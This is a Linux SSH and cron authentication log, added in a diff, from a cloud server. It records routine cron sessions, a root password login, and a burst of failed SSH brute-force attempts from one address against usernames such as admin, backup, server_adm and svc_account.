@@ -1,0 +1,385 @@
+Mar  6 06:18:01 ip-172-31-35-28 CRON[1119]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:18:01 ip-172-31-35-28 CRON[1118]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:18:01 ip-172-31-35-28 CRON[1117]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:18:01 ip-172-31-35-28 CRON[1118]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:18:01 ip-172-31-35-28 CRON[1119]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:18:01 ip-172-31-35-28 CRON[1117]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:19:01 ip-172-31-35-28 CRON[1366]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:19:01 ip-172-31-35-28 CRON[1367]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:19:01 ip-172-31-35-28 CRON[1366]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:19:01 ip-172-31-35-28 CRON[1367]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:19:52 ip-172-31-35-28 sshd[1465]: AuthorizedKeysCommand /usr/share/ec2-instance-connect/eic_run_authorized_keys root SHA256:4vycLsDMzI+hyb9OP3wd18zIpyTqJmRq/QIZaLNrg8A failed, status 22
+Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: Accepted password for root from 203.101.190.9 port 42825 ssh2
+Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
+Mar  6 06:19:54 ip-172-31-35-28 systemd-logind[411]: New session 6 of user root.
+Mar  6 06:19:54 ip-172-31-35-28 systemd: pam_unix(systemd-user:session): session opened for user root(uid=0) by (uid=0)
+Mar  6 06:20:01 ip-172-31-35-28 CRON[1599]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:20:01 ip-172-31-35-28 CRON[1600]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:20:01 ip-172-31-35-28 CRON[1599]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:20:01 ip-172-31-35-28 CRON[1600]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:21:01 ip-172-31-35-28 CRON[1628]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:21:01 ip-172-31-35-28 CRON[1629]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:21:01 ip-172-31-35-28 CRON[1629]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:21:01 ip-172-31-35-28 CRON[1628]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:22:01 ip-172-31-35-28 CRON[1650]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:22:01 ip-172-31-35-28 CRON[1649]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:22:01 ip-172-31-35-28 CRON[1649]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:22:01 ip-172-31-35-28 CRON[1650]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:23:01 ip-172-31-35-28 CRON[2183]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:23:01 ip-172-31-35-28 CRON[2184]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:23:01 ip-172-31-35-28 CRON[2183]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:23:01 ip-172-31-35-28 CRON[2184]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:24:01 ip-172-31-35-28 CRON[2199]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:24:01 ip-172-31-35-28 CRON[2198]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:24:01 ip-172-31-35-28 CRON[2199]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:24:01 ip-172-31-35-28 CRON[2198]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:25:01 ip-172-31-35-28 CRON[2218]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar  6 06:25:01 ip-172-31-35-28 CRON[2220]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:25:01 ip-172-31-35-28 CRON[2219]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar  6 06:25:01 ip-172-31-35-28 CRON[2221]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:25:01 ip-172-31-35-28 CRON[2220]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:25:01 ip-172-31-35-28 CRON[2221]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:25:01 ip-172-31-35-28 CRON[2219]: pam_unix(cron:session): session closed for user root
+Mar  6 06:25:01 ip-172-31-35-28 CRON[2218]: pam_unix(cron:session): session closed for user root
+Mar  6 06:26:01 ip-172-31-35-28 CRON[2246]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:26:01 ip-172-31-35-28 CRON[2245]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:26:01 ip-172-31-35-28 CRON[2246]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:26:01 ip-172-31-35-28 CRON[2245]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:27:01 ip-172-31-35-28 CRON[2259]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:27:01 ip-172-31-35-28 CRON[2258]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:27:01 ip-172-31-35-28 CRON[2258]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:27:01 ip-172-31-35-28 CRON[2259]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:28:01 ip-172-31-35-28 CRON[2273]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:28:01 ip-172-31-35-28 CRON[2272]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:28:01 ip-172-31-35-28 CRON[2273]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:28:01 ip-172-31-35-28 CRON[2272]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:29:01 ip-172-31-35-28 CRON[2285]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:29:01 ip-172-31-35-28 CRON[2286]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:29:01 ip-172-31-35-28 CRON[2285]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:29:01 ip-172-31-35-28 CRON[2286]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:30:01 ip-172-31-35-28 CRON[2298]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:30:01 ip-172-31-35-28 CRON[2299]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:30:01 ip-172-31-35-28 CRON[2298]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:30:01 ip-172-31-35-28 CRON[2299]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:31:01 ip-172-31-35-28 CRON[2314]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:31:01 ip-172-31-35-28 CRON[2313]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:31:01 ip-172-31-35-28 CRON[2314]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:31:01 ip-172-31-35-28 CRON[2313]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Invalid user admin from 65.2.161.68 port 46380
+Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Received disconnect from 65.2.161.68 port 46380:11: Bye Bye [preauth]
+Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Disconnected from invalid user admin 65.2.161.68 port 46380 [preauth]
+Mar  6 06:31:31 ip-172-31-35-28 sshd[620]: error: beginning MaxStartups throttling
+Mar  6 06:31:31 ip-172-31-35-28 sshd[620]: drop connection #10 from [65.2.161.68]:46482 on [172.31.35.28]:22 past MaxStartups
+Mar  6 06:31:31 ip-172-31-35-28 sshd[2327]: Invalid user admin from 65.2.161.68 port 46392
+Mar  6 06:31:31 ip-172-31-35-28 sshd[2327]: pam_unix(sshd:auth): check pass; user unknown
+Mar  6 06:31:31 ip-172-31-35-28 sshd[2327]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
+Mar  6 06:31:31 ip-172-31-35-28 sshd[2332]: Invalid user admin from 65.2.161.68 port 46444
+Mar  6 06:31:31 ip-172-31-35-28 sshd[2331]: Invalid user admin from 65.2.161.68 port 46436
+Mar  6 06:31:31 ip-172-31-35-28 sshd[2332]: pam_unix(sshd:auth): check pass; user unknown
+Mar  6 06:31:31 ip-172-31-35-28 sshd[2332]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
+Mar  6 06:31:31 ip-172-31-35-28 sshd[2331]: pam_unix(sshd:auth): check pass; user unknown
+Mar  6 06:31:31 ip-172-31-35-28 sshd[2331]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
+Mar  6 06:31:31 ip-172-31-35-28 sshd[2330]: Invalid user admin from 65.2.161.68 port 46422
+Mar  6 06:31:31 ip-172-31-35-28 sshd[2337]: Invalid user admin from 65.2.161.68 port 46498
+Mar  6 06:31:31 ip-172-31-35-28 sshd[2328]: Invalid user admin from 65.2.161.68 port 46390
+Mar  6 06:31:31 ip-172-31-35-28 sshd[2335]: Invalid user admin from 65.2.161.68 port 46460
+Mar  6 06:31:31 ip-172-31-35-28 sshd[2337]: pam_unix(sshd:auth): check pass; user unknown
+Mar  6 06:31:31 ip-172-31-35-28 sshd[2337]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
+Mar  6 06:31:31 ip-172-31-35-28 sshd[2335]: pam_unix(sshd:auth): check pass; user unknown
+Mar  6 06:31:31 ip-172-31-35-28 sshd[2335]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
+Mar  6 06:31:31 ip-172-31-35-28 sshd[2334]: Invalid user admin from 65.2.161.68 port 46454
+Mar  6 06:31:31 ip-172-31-35-28 sshd[2329]: Invalid user admin from 65.2.161.68 port 46414
+Mar  6 06:31:31 ip-172-31-35-28 sshd[2338]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68  user=backup
+Mar  6 06:31:31 ip-172-31-35-28 sshd[2330]: pam_unix(sshd:auth): check pass; user unknown
+Mar  6 06:31:31 ip-172-31-35-28 sshd[2334]: pam_unix(sshd:auth): check pass; user unknown
+Mar  6 06:31:31 ip-172-31-35-28 sshd[2334]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
+Mar  6 06:31:31 ip-172-31-35-28 sshd[2336]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68  user=backup
+Mar  6 06:31:31 ip-172-31-35-28 sshd[2330]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
+Mar  6 06:31:31 ip-172-31-35-28 sshd[2328]: pam_unix(sshd:auth): check pass; user unknown
+Mar  6 06:31:31 ip-172-31-35-28 sshd[2328]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
+Mar  6 06:31:31 ip-172-31-35-28 sshd[2333]: Invalid user admin from 65.2.161.68 port 46452
+Mar  6 06:31:31 ip-172-31-35-28 sshd[2329]: pam_unix(sshd:auth): check pass; user unknown
+Mar  6 06:31:31 ip-172-31-35-28 sshd[2329]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
+Mar  6 06:31:31 ip-172-31-35-28 sshd[2333]: pam_unix(sshd:auth): check pass; user unknown
+Mar  6 06:31:31 ip-172-31-35-28 sshd[2333]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
+Mar  6 06:31:31 ip-172-31-35-28 sshd[2352]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68  user=backup
+Mar  6 06:31:31 ip-172-31-35-28 sshd[2351]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68  user=backup
+Mar  6 06:31:31 ip-172-31-35-28 sshd[2355]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68  user=backup
+Mar  6 06:31:32 ip-172-31-35-28 sshd[2357]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68  user=backup
+Mar  6 06:31:33 ip-172-31-35-28 sshd[2327]: Failed password for invalid user admin from 65.2.161.68 port 46392 ssh2
+Mar  6 06:31:33 ip-172-31-35-28 sshd[2331]: Failed password for invalid user admin from 65.2.161.68 port 46436 ssh2
+Mar  6 06:31:33 ip-172-31-35-28 sshd[2332]: Failed password for invalid user admin from 65.2.161.68 port 46444 ssh2
+Mar  6 06:31:33 ip-172-31-35-28 sshd[2335]: Failed password for invalid user admin from 65.2.161.68 port 46460 ssh2
+Mar  6 06:31:33 ip-172-31-35-28 sshd[2337]: Failed password for invalid user admin from 65.2.161.68 port 46498 ssh2
+Mar  6 06:31:33 ip-172-31-35-28 sshd[2334]: Failed password for invalid user admin from 65.2.161.68 port 46454 ssh2
+Mar  6 06:31:33 ip-172-31-35-28 sshd[2338]: Failed password for backup from 65.2.161.68 port 46512 ssh2
+Mar  6 06:31:33 ip-172-31-35-28 sshd[2336]: Failed password for backup from 65.2.161.68 port 46468 ssh2
+Mar  6 06:31:33 ip-172-31-35-28 sshd[2330]: Failed password for invalid user admin from 65.2.161.68 port 46422 ssh2
+Mar  6 06:31:33 ip-172-31-35-28 sshd[2328]: Failed password for invalid user admin from 65.2.161.68 port 46390 ssh2
+Mar  6 06:31:33 ip-172-31-35-28 sshd[2329]: Failed password for invalid user admin from 65.2.161.68 port 46414 ssh2
+Mar  6 06:31:33 ip-172-31-35-28 sshd[2333]: Failed password for invalid user admin from 65.2.161.68 port 46452 ssh2
+Mar  6 06:31:34 ip-172-31-35-28 sshd[2352]: Failed password for backup from 65.2.161.68 port 46568 ssh2
+Mar  6 06:31:34 ip-172-31-35-28 sshd[2351]: Failed password for backup from 65.2.161.68 port 46538 ssh2
+Mar  6 06:31:34 ip-172-31-35-28 sshd[2355]: Failed password for backup from 65.2.161.68 port 46576 ssh2
+Mar  6 06:31:34 ip-172-31-35-28 sshd[2357]: Failed password for backup from 65.2.161.68 port 46582 ssh2
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2327]: Received disconnect from 65.2.161.68 port 46392:11: Bye Bye [preauth]
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2327]: Disconnected from invalid user admin 65.2.161.68 port 46392 [preauth]
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2332]: Received disconnect from 65.2.161.68 port 46444:11: Bye Bye [preauth]
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2332]: Disconnected from invalid user admin 65.2.161.68 port 46444 [preauth]
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2331]: Received disconnect from 65.2.161.68 port 46436:11: Bye Bye [preauth]
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2331]: Disconnected from invalid user admin 65.2.161.68 port 46436 [preauth]
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2337]: Received disconnect from 65.2.161.68 port 46498:11: Bye Bye [preauth]
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2337]: Disconnected from invalid user admin 65.2.161.68 port 46498 [preauth]
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2328]: Received disconnect from 65.2.161.68 port 46390:11: Bye Bye [preauth]
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2328]: Disconnected from invalid user admin 65.2.161.68 port 46390 [preauth]
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2330]: Received disconnect from 65.2.161.68 port 46422:11: Bye Bye [preauth]
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2330]: Disconnected from invalid user admin 65.2.161.68 port 46422 [preauth]
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2334]: Received disconnect from 65.2.161.68 port 46454:11: Bye Bye [preauth]
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2334]: Disconnected from invalid user admin 65.2.161.68 port 46454 [preauth]
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2335]: Received disconnect from 65.2.161.68 port 46460:11: Bye Bye [preauth]
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2335]: Disconnected from invalid user admin 65.2.161.68 port 46460 [preauth]
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2329]: Received disconnect from 65.2.161.68 port 46414:11: Bye Bye [preauth]
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2329]: Disconnected from invalid user admin 65.2.161.68 port 46414 [preauth]
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2333]: Received disconnect from 65.2.161.68 port 46452:11: Bye Bye [preauth]
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2333]: Disconnected from invalid user admin 65.2.161.68 port 46452 [preauth]
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2359]: Invalid user server_adm from 65.2.161.68 port 46596
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2359]: pam_unix(sshd:auth): check pass; user unknown
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2359]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2361]: Invalid user server_adm from 65.2.161.68 port 46614
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2361]: pam_unix(sshd:auth): check pass; user unknown
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2361]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2368]: Invalid user server_adm from 65.2.161.68 port 46676
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2368]: pam_unix(sshd:auth): check pass; user unknown
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2368]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2369]: Invalid user server_adm from 65.2.161.68 port 46682
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2366]: Invalid user server_adm from 65.2.161.68 port 46648
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2365]: Invalid user server_adm from 65.2.161.68 port 46644
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2364]: Invalid user server_adm from 65.2.161.68 port 46632
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2369]: pam_unix(sshd:auth): check pass; user unknown
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2369]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2367]: Invalid user server_adm from 65.2.161.68 port 46664
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2365]: pam_unix(sshd:auth): check pass; user unknown
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2365]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2366]: pam_unix(sshd:auth): check pass; user unknown
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2363]: Invalid user server_adm from 65.2.161.68 port 46620
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2366]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2364]: pam_unix(sshd:auth): check pass; user unknown
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2364]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2367]: pam_unix(sshd:auth): check pass; user unknown
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2367]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2363]: pam_unix(sshd:auth): check pass; user unknown
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2363]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2377]: Invalid user server_adm from 65.2.161.68 port 46684
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2377]: pam_unix(sshd:auth): check pass; user unknown
+Mar  6 06:31:35 ip-172-31-35-28 sshd[2377]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
+Mar  6 06:31:36 ip-172-31-35-28 sshd[2338]: Received disconnect from 65.2.161.68 port 46512:11: Bye Bye [preauth]
+Mar  6 06:31:36 ip-172-31-35-28 sshd[2338]: Disconnected from authenticating user backup 65.2.161.68 port 46512 [preauth]
+Mar  6 06:31:36 ip-172-31-35-28 sshd[2336]: Received disconnect from 65.2.161.68 port 46468:11: Bye Bye [preauth]
+Mar  6 06:31:36 ip-172-31-35-28 sshd[2336]: Disconnected from authenticating user backup 65.2.161.68 port 46468 [preauth]
+Mar  6 06:31:36 ip-172-31-35-28 sshd[2379]: Invalid user server_adm from 65.2.161.68 port 46698
+Mar  6 06:31:36 ip-172-31-35-28 sshd[2379]: pam_unix(sshd:auth): check pass; user unknown
+Mar  6 06:31:36 ip-172-31-35-28 sshd[2379]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
+Mar  6 06:31:36 ip-172-31-35-28 sshd[2380]: Invalid user server_adm from 65.2.161.68 port 46710
+Mar  6 06:31:36 ip-172-31-35-28 sshd[2380]: pam_unix(sshd:auth): check pass; user unknown
+Mar  6 06:31:36 ip-172-31-35-28 sshd[2380]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
+Mar  6 06:31:36 ip-172-31-35-28 sshd[2352]: Received disconnect from 65.2.161.68 port 46568:11: Bye Bye [preauth]
+Mar  6 06:31:36 ip-172-31-35-28 sshd[2352]: Disconnected from authenticating user backup 65.2.161.68 port 46568 [preauth]
+Mar  6 06:31:36 ip-172-31-35-28 sshd[2351]: Received disconnect from 65.2.161.68 port 46538:11: Bye Bye [preauth]
+Mar  6 06:31:36 ip-172-31-35-28 sshd[2351]: Disconnected from authenticating user backup 65.2.161.68 port 46538 [preauth]
+Mar  6 06:31:36 ip-172-31-35-28 sshd[2383]: Invalid user svc_account from 65.2.161.68 port 46722
+Mar  6 06:31:36 ip-172-31-35-28 sshd[2383]: pam_unix(sshd:auth): check pass; user unknown
+Mar  6 06:31:36 ip-172-31-35-28 sshd[2383]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
+Mar  6 06:31:36 ip-172-31-35-28 sshd[2384]: Invalid user svc_account from 65.2.161.68 port 46732
+Mar  6 06:31:36 ip-172-31-35-28 sshd[2384]: pam_unix(sshd:auth): check pass; user unknown
+Mar  6 06:31:36 ip-172-31-35-28 sshd[2384]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
+Mar  6 06:31:36 ip-172-31-35-28 sshd[2355]: Received disconnect from 65.2.161.68 port 46576:11: Bye Bye [preauth]
+Mar  6 06:31:36 ip-172-31-35-28 sshd[2355]: Disconnected from authenticating user backup 65.2.161.68 port 46576 [preauth]
+Mar  6 06:31:36 ip-172-31-35-28 sshd[2357]: Failed password for backup from 65.2.161.68 port 46582 ssh2
+Mar  6 06:31:36 ip-172-31-35-28 sshd[2387]: Invalid user svc_account from 65.2.161.68 port 46742
+Mar  6 06:31:36 ip-172-31-35-28 sshd[2387]: pam_unix(sshd:auth): check pass; user unknown
+Mar  6 06:31:36 ip-172-31-35-28 sshd[2387]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
+Mar  6 06:31:36 ip-172-31-35-28 sshd[2357]: Received disconnect from 65.2.161.68 port 46582:11: Bye Bye [preauth]
+Mar  6 06:31:36 ip-172-31-35-28 sshd[2357]: Disconnected from authenticating user backup 65.2.161.68 port 46582 [preauth]
+Mar  6 06:31:36 ip-172-31-35-28 sshd[2357]: PAM 1 more authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68  user=backup
+Mar  6 06:31:36 ip-172-31-35-28 sshd[2389]: Invalid user svc_account from 65.2.161.68 port 46744
+Mar  6 06:31:36 ip-172-31-35-28 sshd[2389]: pam_unix(sshd:auth): check pass; user unknown
+Mar  6 06:31:36 ip-172-31-35-28 sshd[2389]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2359]: Failed password for invalid user server_adm from 65.2.161.68 port 46596 ssh2
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2361]: Failed password for invalid user server_adm from 65.2.161.68 port 46614 ssh2
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2368]: Failed password for invalid user server_adm from 65.2.161.68 port 46676 ssh2
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2359]: Received disconnect from 65.2.161.68 port 46596:11: Bye Bye [preauth]
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2359]: Disconnected from invalid user server_adm 65.2.161.68 port 46596 [preauth]
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2369]: Failed password for invalid user server_adm from 65.2.161.68 port 46682 ssh2
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2365]: Failed password for invalid user server_adm from 65.2.161.68 port 46644 ssh2
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2366]: Failed password for invalid user server_adm from 65.2.161.68 port 46648 ssh2
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2364]: Failed password for invalid user server_adm from 65.2.161.68 port 46632 ssh2
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2367]: Failed password for invalid user server_adm from 65.2.161.68 port 46664 ssh2
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2363]: Failed password for invalid user server_adm from 65.2.161.68 port 46620 ssh2
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2361]: Received disconnect from 65.2.161.68 port 46614:11: Bye Bye [preauth]
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2361]: Disconnected from invalid user server_adm 65.2.161.68 port 46614 [preauth]
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2368]: Received disconnect from 65.2.161.68 port 46676:11: Bye Bye [preauth]
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2368]: Disconnected from invalid user server_adm 65.2.161.68 port 46676 [preauth]
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2391]: Invalid user svc_account from 65.2.161.68 port 46750
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2391]: pam_unix(sshd:auth): check pass; user unknown
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2391]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2364]: Received disconnect from 65.2.161.68 port 46632:11: Bye Bye [preauth]
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2364]: Disconnected from invalid user server_adm 65.2.161.68 port 46632 [preauth]
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2369]: Received disconnect from 65.2.161.68 port 46682:11: Bye Bye [preauth]
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2369]: Disconnected from invalid user server_adm 65.2.161.68 port 46682 [preauth]
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2366]: Received disconnect from 65.2.161.68 port 46648:11: Bye Bye [preauth]
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2366]: Disconnected from invalid user server_adm 65.2.161.68 port 46648 [preauth]
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2365]: Received disconnect from 65.2.161.68 port 46644:11: Bye Bye [preauth]
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2365]: Disconnected from invalid user server_adm 65.2.161.68 port 46644 [preauth]
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2363]: Received disconnect from 65.2.161.68 port 46620:11: Bye Bye [preauth]
